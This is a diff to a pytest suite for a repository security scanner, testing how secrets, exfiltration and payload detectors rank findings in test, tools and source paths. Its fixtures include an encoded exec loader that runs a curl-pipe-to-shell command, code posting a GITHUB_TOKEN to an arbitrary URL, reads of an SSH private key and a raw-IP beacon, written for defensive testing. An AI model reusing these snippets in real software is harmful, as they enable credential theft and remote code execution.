@@ -35,7 +35,8 @@ def _scan(files: dict[str, str]) -> dict:
 def test_certbot_style_asset_key_uses_the_new_review_rule():
     # 2026.11.07-8: info (was review in -7), consistent with the exact tests/ and docs/ fixture rule
     f = next(x for x in _scan({"certbot-ci/certbot_integration_tests/assets/key.pem": KEY})["findings"] if x["source"] == "Secrets")
-    assert f["sev"] == "Low" and not f["strong"] and "assets" in f["info_reason"] and "to info" in f["info_reason"]
+    # -9: the shared classifier names the first non-shipping directory (certbot_integration_tests -> "tests")
+    assert f["sev"] == "Low" and not f["strong"] and "non-shipping" in f["info_reason"] and "to info" in f["info_reason"]
 
 
 @pytest.mark.parametrize("path", ["certbot-ci/certbot_integration_tests/assets/key.pem",
@@ -70,7 +71,8 @@ def test_the_same_key_elsewhere_is_still_strong(path):
 
 def test_sample_looking_aws_key_in_assets_is_review_but_real_looking_key_elsewhere_stays_strong():
     assert repo_scan.secret_review_reason("assets/config.py", "AWS access key id", "aws_key = 'AKIAABCDEFGHTESTKEY1'")
-    assert repo_scan.secret_review_reason("assets/config.py", "AWS access key id", "aws_key = 'AKIAQWERTYUIOPASDFGH'") is None
+    # -9 (A1): every secret kind in a non-shipping path is info, not only private keys / sample-looking keys
+    assert repo_scan.secret_review_reason("assets/config.py", "AWS access key id", "aws_key = 'AKIAQWERTYUIOPASDFGH'")
     assert repo_scan.secret_review_reason("src/config.py", "AWS access key id", "k = 'AKIAABCDEFGHTESTKEY1'") is None
 
 
@@ -113,7 +115,7 @@ def test_single_indicators_in_dev_tooling_become_info():
     js = "const env = JSON.stringify(process.env);\nconsole.log(env.length);\n"
     r = _behavior({"scripts/release.js": js, "tools/dump.js": js})
     assert r["findings"] == [] and len(r["info_findings"]) == 2
-    assert all("development-tooling path" in i["info_reason"] for i in r["info_findings"])
+    assert all("non-shipping path" in i["info_reason"] for i in r["info_findings"])   # -9: shared classifier wording
     py = "def backup():\n    return open('/home/u/.ssh/id_ed25519').read()\n"
     c = CE.detect(DetectorContext.build(scan={"ran": True, "malware_proof": {"findings": []}, "findings": []},
                                         data={"text": {"tasks.py": py, "pkg/core.py": py}}))
@@ -245,3 +247,78 @@ def test_ssh_alias_list_is_explicit_and_documented():
     assert CE.SSH_CLIENT_LIBS == {"paramiko", "asyncssh", "fabric"}
     import inspect
     assert "HAND-MAINTAINED" in inspect.getsource(CE)
+
+
+
+# ================================================================== round 3 (ruleset 2026.11.07-9): shared classifier
+
+from detectors.paths import non_shipping
+
+
+@pytest.mark.parametrize("path, expect", [
+    ("tests/a.py", True), ("pkg/testdata/x.py", True), ("docs/_static/js/a.js", True), ("site/_build/x.js", True),
+    ("tools/release.py", True), ("scripts/x.sh", True), (".agents/skills/x.py", True), ("tasks.py", True),
+    ("noxfile.py", True), ("certbot-ci/certbot_integration_tests/x.py", True), ("sample-config/x.py", True),
+    ("src/pkg/a.py", False), ("setup.py", False), (".github/workflows/ci.yml", False), ("pkg/toolsmith.py", False),
+])
+def test_non_shipping_classifier(path, expect):
+    assert bool(non_shipping(path)) is expect, path
+
+
+def _cscan(files):
+    return DetectorContext.build(scan={"ran": True, "malware_proof": {"findings": [], "layers": {}}, "findings": []}, data={"text": files})
+
+
+def test_raw_ip_url_in_testdata_is_info_in_src_is_review():
+    code = "URL = 'http://37.120.14.20:8080/feed'\n"   # inert text; documentation ranges are ignored by this rule
+    r = _behavior({"pkg/testdata/feed.py": code, "src/pkg/feed.py": code})
+    assert [f["file"] for f in r["findings"] if "raw IP" in f["rule"]] == ["src/pkg/feed.py"]
+    info = [i for i in r["info_findings"] if "raw IP" in i["rule"]]
+    assert [i["file"] for i in info] == ["pkg/testdata/feed.py"] and "non-shipping" in info[0]["info_reason"]
+
+
+def test_named_credential_to_dynamic_host_in_tools_is_info_in_src_is_review():
+    code = "import os, requests\ndef send(url):\n    requests.post(url, data=os.environ['GITHUB_TOKEN'])\n"
+    out = {r["detector"]: r for r in run_detectors(_cscan({"tools/notify.py": code, "src/pkg/notify.py": code}))}
+    c = out["credential_exfiltration"]
+    assert [f["file"] for f in c["findings"]] == ["src/pkg/notify.py"] and c["tier"] == "review"
+    assert [i["file"] for i in c["info_findings"]] == ["tools/notify.py"]
+
+
+def test_decoded_payload_under_tests_stays_high_risk():
+    import base64, zlib
+    enc = base64.b64encode(zlib.compress(b'import os; os.system("curl http://198.51.100.4/x | sh")')).decode()
+    code = f"import base64, zlib\nexec(zlib.decompress(base64.b64decode('{enc}')).decode())\n"
+    data = {"text": {"tests/helpers/boot.py": code}, "py": {}, "binaries": [], "all_py_paths": set()}
+    from malware_proof import scan_ast_deobfuscation
+    proof = {"findings": scan_ast_deobfuscation(data["text"], lambda f, ln: None)["findings"], "layers": {"layer1": {"status": "ran"}}}
+    r = next(x for x in run_detectors(DetectorContext.build(scan={"ran": True, "malware_proof": proof, "findings": []}))
+             if x["detector"] == "decoded_payload")
+    assert r["tier"] == "high_risk" and r["findings"][0]["file"] == "tests/helpers/boot.py"
+
+
+def test_committed_binary_in_fixtures_is_info():
+    f = {"sev": "Medium", "source": "Behavior", "cat": "Binary", "rule": "Binary: compiled executable committed to the repo",
+         "file": "tests/fixtures/tool.exe", "line": 1, "detail": "", "fix": "", "url": None, "strong": False}
+    proof = {"findings": [f, {**f, "file": "bin/tool.exe"}], "layers": {"behavior": {"status": "ran"}}}
+    r = next(x for x in run_detectors(DetectorContext.build(scan={"ran": True, "malware_proof": proof, "findings": []}))
+             if x["detector"] == "committed_binary")
+    assert [x["file"] for x in r["findings"]] == ["bin/tool.exe"] and [i["file"] for i in r["info_findings"]] == ["tests/fixtures/tool.exe"]
+
+
+def test_sphinx_static_phantom_is_info_but_phantom_with_network_stays_high_risk():
+    from detectors import tagless_release
+    from release_helpers import history, npm_release, with_git
+    plain = npm_release("1.2.0", "2026-03-01T00:00:00Z", files={"docs/_static/searchtools.js": "var Search = {};\n"})
+    rc = with_git(history([plain]), default_tree={"index.js"}, tags=["v1.2.0"], matched="v1.2.0")
+    r = tagless_release.detect(DetectorContext.build(releases=rc))
+    assert r["findings"] == [] and r["info_findings"][0]["file"] == "docs/_static/searchtools.js"
+    net = npm_release("1.2.0", "2026-03-01T00:00:00Z", files={"docs/_static/beacon.js": "const https = require('https');\nhttps.get('https://198.51.100.7/b');\n"})
+    rc2 = with_git(history([net]), default_tree={"index.js"}, tags=["v1.2.0"], matched="v1.2.0")
+    r2 = tagless_release.detect(DetectorContext.build(releases=rc2))
+    assert [f["tier"] for f in r2["findings"]] == ["high_risk"]
+
+
+def test_ruleset_is_frozen():
+    from detectors import version
+    assert version.RULESET_FROZEN is True and version.RULESET_VERSION == "2026.11.07-9"
